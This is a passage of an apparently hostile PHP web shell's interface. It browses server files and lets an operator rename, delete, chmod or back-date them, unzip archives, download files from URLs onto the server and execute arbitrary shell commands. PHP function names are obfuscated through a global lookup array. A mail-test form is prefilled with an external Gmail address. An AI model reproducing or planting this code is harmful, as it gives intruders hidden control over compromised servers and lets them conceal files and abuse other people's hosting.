                    <tr class="hover:bg-gray-700/50 item-row" data-path="<?= $item_path_encoded ?>" data-name="<?= $GLOBALS['_q_'][37]($item['name']) ?>" data-is-dir="<?= $is_item_dir ? '1' : '0' ?>">
                        <td class="p-3">
                            <a href="<?= $is_item_dir ? '?p='.$item_path_encoded : '?action=view&item='.$item_path_encoded.'&p='.$current_path_encoded ?>" class="flex items-center gap-2 text-blue-400 hover:underline">
                                <i class="icon-md flex-shrink-0 <?= $is_item_dir ? 'fas fa-folder' : 'fas fa-file-alt' ?>"></i>
                                <span class="truncate"><?= $GLOBALS['_q_'][37]($item['name']) ?></span>
                            </a>
                        </td>
                        <td class="p-3 whitespace-nowrap"><?= $is_item_dir ? '-' : formatSize($GLOBALS['_q_'][55]($item['path'])) ?></td>
                        <td class="p-3 whitespace-nowrap">
                             <a href="#" onclick="showChmodModal('<?= $item_path_encoded ?>', '<?= $perms ?>')" class="font-mono text-yellow-400 hover:underline"><?= $perms ?></a>
                        </td>
                        <td class="p-3 whitespace-nowrap"><?= $GLOBALS['_q_'][56]('Y-m-d H:i', $GLOBALS['_q_'][57]($item['path'])) ?></td>
                        <td class="p-3 whitespace-nowrap flex items-center gap-x-3">
                            <a href="?action=download&item=<?= $item_path_encoded ?>" class="text-green-400 hover:underline" title="Download"><i class="fas fa-download"></i></a>
                            <a href="#" onclick="showRenameModal('<?= $GLOBALS['_q_'][37]($item['name']) ?>')" class="text-blue-400 hover:underline" title="Rename"><i class="fas fa-edit"></i></a>
                            <a href="#" onclick="showTouchModal('<?= $item_path_encoded ?>', '<?= $GLOBALS['_q_'][37]($item['name']) ?>')" class="text-purple-400 hover:underline" title="Edit Timestamp"><i class="fas fa-clock"></i></a>
                            <a href="?action=delete&item=<?= $item_path_encoded ?>&p=<?= $current_path_encoded ?>" onclick="return confirm('Are you sure?')" class="text-red-400 hover:underline" title="Delete"><i class="fas fa-trash-alt"></i></a>
                            
                            <?php if (!$is_item_dir):
                                $path_without_root = $GLOBALS['_q_'][84]($_SERVER['DOCUMENT_ROOT'], '', $item['path']); // str_replace()
                                $web_path = $GLOBALS['_q_'][84](DIRECTORY_SEPARATOR, '/', $path_without_root); // str_replace()
                            ?>
                                <a href="<?= $web_path ?>" target="_blank" class="text-cyan-400 hover:underline" title="Run/View in New Tab"><i class="fas fa-eye"></i></a>
                                
                                <?php if ($GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item['path'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                    <a href="#" onclick="unzipItem('<?= $item_path_encoded ?>'); return false;" class="text-orange-400 hover:underline" title="Unzip"><i class="fas fa-file-archive"></i></a>
                                <?php endif; ?>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php endif; ?>
    </div>

    <div id="upload-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Upload Files</h2>
            <form method="POST" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="files[]" multiple class="block w-full text-sm text-gray-300 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"/>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Upload</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="create_file-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New File</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <input type="text" name="name" placeholder="File name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="create_folder-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Create New Folder</h2>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <input type="text" name="name" placeholder="Folder name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-green">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="rename-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Rename Item</h2>
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="rename-old-name">
                <input type="text" name="new_name" id="rename-new-name" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Rename</button>
                </div>
            </form>
        </div>
    </div>

    <div id="chmod-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Change Permissions</h2>
            <form method="GET">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="item" id="chmod-item-path">
                <input type="hidden" name="p" value="<?= $current_path_encoded ?>">
                <input type="text" name="perms" id="chmod-perms" class="w-full bg-gray-900 text-white p-2 rounded font-mono" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Set</button>
                </div>
            </form>
        </div>
    </div>
    
    <div id="touch-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Edit Timestamp</h2>
            <form method="POST">
                <input type="hidden" name="action" value="touch">
                <input type="hidden" name="item" id="touch-item-path">
                <p id="touch-item-name" class="text-gray-300 mb-2 truncate"></p>
                <input type="datetime-local" name="time" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Update</button>
                </div>
            </form>
        </div>
    </div>

    <div id="cmd-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-2xl h-3/4 flex flex-col">
            <h2 class="text-xl text-white font-bold mb-4">Execute Command</h2>
            <div id="cmd-output" class="flex-grow bg-gray-900 text-white p-2 rounded overflow-y-auto mb-2 font-mono text-sm whitespace-pre-wrap"></div>
            <div class="flex gap-2">
                <input type="text" id="cmd-input" placeholder="Enter command" class="flex-grow bg-gray-900 text-white p-2 rounded-lg">
            </div>
            <div class="flex gap-2 mt-2 justify-end">
                <button id="cmd-execute" class="btn btn-blue">Execute</button>
                <button type="button" class="btn btn-gray" onclick="hideAllModals()">Close</button>
            </div>
        </div>
    </div>
    
    <div id="download_url-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Download File from URL</h2>
            <form method="POST">
                <input type="hidden" name="action" value="download_url">
                <input type="text" name="url" placeholder="Enter file URL" class="w-full bg-gray-900 text-white p-2 rounded mb-3" required>
                <input type="text" name="filename" placeholder="Save as (e.g., file.zip)" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-blue">Download</button>
                </div>
            </form>
        </div>
    </div>

    <div id="mail_test-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
            <h2 class="text-xl text-white font-bold mb-4">Mail Tester</h2>
            <form method="POST">
                <input type="hidden" name="action" value="mail_test">
                <label for="to_email" class="block text-sm font-medium text-gray-300 mb-1">Recipient Email:</label>
                <input type="email" name="to_email" id="to_email" value="zerosec235@gmail.com" class="w-full bg-gray-900 text-white p-2 rounded" required>
                <div class="mt-4 flex justify-end gap-2">
                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
                    <button type="submit" class="btn btn-yellow">Send Test</button>
                </div>
            </form>
        </div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const modals = document.querySelectorAll('.modal');
    function hideAllModals() {
        modals.forEach(m => m.classList.remove('active'));
    }
    window.showModal = (id) => {
        hideAllModals();
        document.getElementById(id + '-modal').classList.add('active');
    };
    window.hideAllModals = hideAllModals;
    window.showRenameModal = (oldName) => {
        document.getElementById('rename-old-name').value = oldName;
        document.getElementById('rename-new-name').value = oldName;
        showModal('rename');
    }
    window.showChmodModal = (itemPath, perms) => {
        document.getElementById('chmod-item-path').value = itemPath;
        document.getElementById('chmod-perms').value = perms;
        showModal('chmod');
    }
    window.showTouchModal = (itemPath, itemName) => {
        document.getElementById('touch-item-path').value = itemPath;
        document.getElementById('touch-item-name').innerText = `Item: ${itemName}`;
        const now = new Date();
        now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
        document.querySelector('#touch-modal input[name="time"]').value = now.toISOString().slice(0,16);
        showModal('touch');
    }
    window.unzipItem = async (itemPath) => {
        if (confirm('Unzip this file?')) {
            alert('Unzipping... please wait.');
            try {
                const response = await fetch(`?action=unzip&item=${itemPath}&p=<?= $current_path_encoded ?>`);
                const result = await response.json();
                if (result.status === 'success') {
                    alert('Unzipped successfully!');
                    window.location.reload();
                } else {
                    alert(`Error: ${result.data}`);
                }
            } catch (e) {
                alert('Failed to unzip file.');
            }
        }
    };
    
    const cmdInput = document.getElementById('cmd-input');
    const cmdOutput = document.getElementById('cmd-output');
    const cmdExecute = document.getElementById('cmd-execute');
    
    const executeCmd = async () => {
        const command = cmdInput.value;
        if (!command) return;
        
        cmdOutput.innerHTML += `<div class="text-yellow-400">> ${command}</div>`;
        cmdInput.value = '';
        
        try {
            // PERBAIKAN: Menggunakan variabel $PATH di Javascript
            const response = await fetch(`?action=cmd&command=${encodeURIComponent(command)}&p=<?= encodePath($PATH) ?>`);
            const result = await response.json();
            const outputText = result.data.replace(/\\n/g, '<br>');
            cmdOutput.innerHTML += `<div>${outputText}</div>`;
        } catch (e) {
            cmdOutput.innerHTML += `<div class="text-red-500">Request failed.</div>`;
        }
        cmdOutput.scrollTop = cmdOutput.scrollHeight;
    };
    
    cmdExecute.addEventListener('click', executeCmd);
    cmdInput.addEventListener('keydown', (e) => { if(e.key === 'Enter') executeCmd(); });

    const flash = document.getElementById('flash-message');
    if(flash) setTimeout(() => flash.style.display = 'none', 3000);
});
</script>
</body>
</html>